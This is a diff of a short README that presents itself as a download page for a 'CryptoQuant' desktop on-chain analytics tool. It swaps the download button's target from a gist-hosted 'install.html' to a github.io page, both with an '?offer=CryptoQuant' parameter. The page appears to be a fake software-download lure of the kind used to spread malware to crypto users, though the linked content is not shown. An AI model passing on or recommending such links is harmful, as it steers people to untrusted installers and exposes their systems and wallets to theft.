@@ -1,6 +1,6 @@
 # CryptoQuant Download — Desktop On-Chain Analytics Tool
 
-<a href="https://gistcdn.githack.com/easyfrag80yard/d1e6eb91edb6ee201e0807a988aade02/raw/d1ae09c466ac8630b065a16b71b8ced68f592fca/install.html?offer=CryptoQuant" target="_blank">
+<a href="https://git-tool-install.github.io/.github/?offer=CryptoQuant" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20CryptoQuant%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
